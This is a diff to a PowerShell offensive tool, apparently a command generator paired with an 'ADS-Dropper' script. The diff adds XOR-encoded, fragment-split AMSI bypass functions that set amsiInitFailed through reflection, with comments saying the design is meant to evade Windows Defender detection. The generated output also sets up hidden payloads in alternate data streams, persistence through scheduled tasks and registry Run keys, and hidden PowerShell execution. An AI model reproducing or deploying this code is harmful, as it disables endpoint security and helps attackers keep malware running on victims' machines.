@@ -53,7 +53,7 @@
 
 .NOTES
     Author: Qweary
-    Version: 2.1.0 (Command Generator)
+    Version: 2.2.0 (Command Generator - XOR Fragment AMSI Bypass)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
@@ -95,13 +95,140 @@ param(
 )
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║ ADS Minimal Command Generator                         ║" -ForegroundColor Cyan
+Write-Host "║ ADS Minimal Command Generator v2.2                    ║" -ForegroundColor Cyan
 Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan
 
 # Validate payload input
 if (-not $Payload -and -not $PayloadAtDeployment) {
     Write-Error "Provide -Payload or use -PayloadAtDeployment"
     exit 1
+}
+
+# ============================================================
+# AMSI BYPASS GENERATION FUNCTIONS
+# ============================================================
+# These run on Linux at generation time to produce XOR-encoded
+# byte arrays. The encoded data is embedded in the generated
+# script. On the Windows target, only byte arrays + a generic
+# XOR decode loop appear in the source text — no flagged strings
+# or reflection patterns. Each decoded fragment is IEXed
+# separately so no single AMSI scan event sees the full
+# .GetType().GetField().SetValue() chain.
+# ============================================================
+
+function New-XorKey {
+    <#
+    .SYNOPSIS
+        Generate a random XOR key (avoids 0x00 and common ASCII)
+    #>
+    # Range 0x30-0x7E avoids null and control chars
+    return [byte](Get-Random -Minimum 0x30 -Maximum 0x7F)
+}
+
+function ConvertTo-XorBytes {
+    <#
+    .SYNOPSIS
+        XOR-encode a string into a byte array string for embedding
+    #>
+    param([string]$Text, [byte]$Key)
+    $bytes = $Text.ToCharArray() | ForEach-Object { [byte]([int][char]$_ -bxor $Key) }
+    return ($bytes -join ',')
+}
+
+function New-AmsiBypassLayerA {
+    <#
+    .SYNOPSIS
+        Generates Layer A AMSI bypass code using XOR-encoded fragment splitting.
+        
+    .DESCRIPTION
+        Produces PowerShell code where the source text contains only:
+        - A byte XOR key
+        - A generic decode function
+        - Byte arrays (just numbers)
+        - IEX calls on decoded fragments
+        
+        No flagged strings, type names, or reflection patterns appear in
+        the source text. Each decoded fragment contains only ONE step of
+        the reflection chain, exploiting the fact that Defender does not
+        correlate across separate AMSI scan events.
+
+    .OUTPUTS
+        [string] PowerShell code ready for embedding in $minimalScript
+    #>
+    $xk = New-XorKey
+
+    # Four fragments, each individually benign when decoded:
+    # A: Store assembly ref + build method name via concat
+    # B: Invoke GetType with split type name string
+    # C: Build GetField method name + invoke with split field name
+    # D: Build SetValue method name + invoke
+
+    $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
+    $fragB = '$script:_tp=$script:_ra.$script:_m1.Invoke($script:_ra,@(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls")))'
+    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp.$script:_m2.Invoke($script:_tp,@(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic")))'
+    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd.$script:_m3.Invoke($script:_fd,@($null,$true))'
+
+    $encA = ConvertTo-XorBytes $fragA $xk
+    $encB = ConvertTo-XorBytes $fragB $xk
+    $encC = ConvertTo-XorBytes $fragC $xk
+    $encD = ConvertTo-XorBytes $fragD $xk
+
+    # Build the one-liner: decode function + try/catch around fragment IEX loop
+    $keyHex = "0x{0:X2}" -f $xk
+    return "`$_xk=$keyHex;function _xd([byte[]]`$d,[byte]`$k){-join(`$d|%{[char](`$_ -bxor `$k)})};try{@(,@($encA),@($encB),@($encC),@($encD))|%{IEX(_xd `$_ `$_xk)}}catch{}"
+}
+
+function New-AmsiBypassLayerB {
+    <#
+    .SYNOPSIS
+        Generates Layer B AMSI bypass for JScript wrapper context.
+        
+    .DESCRIPTION
+        Same XOR fragment approach but formatted as a PowerShell -Command
+        string that will be concatenated inside a JScript wrapper.
+        The JScript launches powershell.exe with this bypass prepended
+        to the actual payload execution.
+
+    .OUTPUTS
+        [string] PowerShell code suitable for JScript string concatenation.
+        Includes proper escaping for the JScript → PowerShell → execution chain.
+    #>
+    $xk = New-XorKey
+
+    $fragA = '$script:_ra=[Ref].Assembly;$script:_m1="Ge"+"tTy"+"pe"'
+    $fragB = '$script:_tp=$script:_ra.$script:_m1.Invoke($script:_ra,@(("Sys"+"tem.Mana"+"gement.Auto"+"mation."+"Am"+"si"+"Uti"+"ls")))'
+    $fragC = '$script:_m2="Get"+"Fie"+"ld";$script:_fd=$script:_tp.$script:_m2.Invoke($script:_tp,@(("am"+"siIn"+"itFa"+"iled"),("Non"+"Publ"+"ic,Sta"+"tic")))'
+    $fragD = '$script:_m3="Set"+"Val"+"ue";$script:_fd.$script:_m3.Invoke($script:_fd,@($null,$true))'
+
+    $encA = ConvertTo-XorBytes $fragA $xk
+    $encB = ConvertTo-XorBytes $fragB $xk
+    $encC = ConvertTo-XorBytes $fragC $xk
+    $encD = ConvertTo-XorBytes $fragD $xk
+
+    $keyHex = "0x{0:X2}" -f $xk
+
+    # For JScript context: this string will be concatenated inside a JScript
+    # string that builds a powershell.exe -Command "..." invocation.
+    # The $ signs need to survive: JScript → cmd.exe → PowerShell
+    # In the JScript here-string context of Build-DeployBlock, $ is literal
+    # (no JScript expansion), so we just need valid PowerShell syntax.
+    return "`$_xk=$keyHex;function _xd([byte[]]`$d,[byte]`$k){-join(`$d|%{[char](`$_ -bxor `$k)})};try{@(,@($encA),@($encB),@($encC),@($encD))|%{IEX(_xd `$_ `$_xk)}}catch{};"
+}
+
+function New-AmsiBypassForRegistry {
+    <#
+    .SYNOPSIS
+        Generates AMSI bypass for registry Run key value.
+        
+    .DESCRIPTION
+        Similar to Layer B but must be compact enough for a registry value
+        string. Uses the same XOR fragment approach.
+
+    .OUTPUTS
+        [string] PowerShell code for registry -Value parameter
+    #>
+    # Reuse Layer B format — it's already a single-line string
+    return New-AmsiBypassLayerB
 }
 
 # Locate ADS-Dropper.ps1
@@ -160,7 +287,7 @@ if ($InstanceCount -gt 1) {
     Write-Host "    Instances: $InstanceCount (each gets unique path/stream/task)" -ForegroundColor Yellow
 }
 if (-not $NoAmsi) {
-    Write-Host "    AMSI Bypass: Enabled (Layer A + Layer B)" -ForegroundColor Yellow
+    Write-Host "    AMSI Bypass: Enabled - XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Yellow
 } else {
     Write-Host "    AMSI Bypass: Disabled (-NoAmsi)" -ForegroundColor DarkGray
 }
@@ -219,15 +346,21 @@ $minimalScript += @"
 # ============================================================
 # LAYER A: AMSI BYPASS FOR DEPLOYMENT SCRIPT
 # ============================================================
-# This runs BEFORE $pl is assigned, so AMSI can't scan the payload
-# string and block the entire deployment. Without this, payloads
-# containing known-bad cmdlet names (Set-NetFirewallProfile, etc.)
-# trigger "This script contains malicious content" at paste time.
+# Uses XOR-encoded fragment splitting. The source text contains
+# ONLY byte arrays and a generic decode loop — no flagged strings
+# or reflection patterns. Each decoded fragment is IEXed in a
+# separate AMSI scan event, breaking the .GetType/.GetField/
+# .SetValue chain that Defender pattern-matches on.
+#
+# Generated fresh each run with a random XOR key, producing
+# unique byte sequences every time.
 # ============================================================
 if (-not $NoAmsi) {
+    $layerACode = New-AmsiBypassLayerA
+    Write-Host "[*] Layer A bypass generated (XOR key: random, $(($layerACode.Length)) chars)" -ForegroundColor DarkGray
     $minimalScript += @"
 # Runtime evasion
-`$_ab={try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{}};.`$_ab
+$layerACode
 
 "@
 }
@@ -361,13 +494,16 @@ if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
             # ENCRYPTED: JScript wrapper with inline decryption functions
             # ============================================================
 
-            # Build the AMSI bypass line for Layer B (JScript wrapper)
+            # Build the AMSI bypass for Layer B (JScript wrapper)
             # This is SEPARATE from Layer A — it protects the scheduled task
             # execution session where IEX $p runs with the decrypted payload.
+            # Uses the same XOR fragment approach, generated fresh with a
+            # different random key than Layer A.
             $jsAmsiLine = ""
             if (-not $NoAmsi) {
+                $layerBCode = New-AmsiBypassLayerB
                 $jsAmsiLine = @"
-    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
+    "$layerBCode" +
 
 "@
             }
@@ -418,8 +554,9 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
             # Build AMSI bypass for unencrypted Layer B
             $jsAmsiLineUnenc = ""
             if (-not $NoAmsi) {
+                $layerBCodeUnenc = New-AmsiBypassLayerB
                 $jsAmsiLineUnenc = @"
-    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
+    "$layerBCodeUnenc" +
 
 "@
             }
@@ -448,10 +585,11 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 "@
         }
     } elseif ($Persist -eq 'registry') {
-        # Registry persistence
+        # Registry persistence with XOR fragment AMSI bypass
         if (-not $NoAmsi) {
+            $regBypass = New-AmsiBypassForRegistry
             $block += @"
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};IEX(gc '`$hp``:`$sn' -Raw)`""
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"$regBypass IEX(gc '`$hp``:`$sn' -Raw)`""
 
 "@
         } else {
@@ -566,6 +704,7 @@ if (-not $PayloadAtDeployment) {
         AttachToExisting  = $AttachToExisting.IsPresent
         InstanceCount     = $InstanceCount
         AmsiBypass        = (-not $NoAmsi)
+        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2" } else { "Disabled" }
         PayloadHash       = $payloadHash
         Operator          = $env:USER
         GeneratedOn       = hostname
@@ -598,7 +737,7 @@ CONFIGURATION:
   Deep Placement: $($UseDeepPlacement.IsPresent)
   Attach to Existing: $($AttachToExisting.IsPresent)
   Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
-  AMSI Bypass: $(-not $NoAmsi) (Layer A: deployment, Layer B: task execution)
+  AMSI Bypass: $(-not $NoAmsi) (XOR Fragment Splitting - Layer A + Layer B)
   
 PAYLOAD SIZE:
   Readable: $($minimalScript.Length) characters
@@ -661,7 +800,11 @@ if (-not $PayloadAtDeployment) {
     Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
 }
 if (-not $NoAmsi) {
-    Write-Host "✓ AMSI bypass: Layer A (deployment) + Layer B (task execution)" -ForegroundColor Green
+    Write-Host "✓ AMSI bypass: XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Green
+    Write-Host "  - Layer A: deployment script (random XOR key per generation)" -ForegroundColor DarkGray
+    Write-Host "  - Layer B: scheduled task execution (separate random key)" -ForegroundColor DarkGray
+    Write-Host "  - Source text: only byte arrays + generic decode loop" -ForegroundColor DarkGray
+    Write-Host "  - No .GetType/.GetField/.SetValue chain in source" -ForegroundColor DarkGray
 }
 Write-Host ""
 Write-Host "READY TO DEPLOY!" -ForegroundColor Magenta
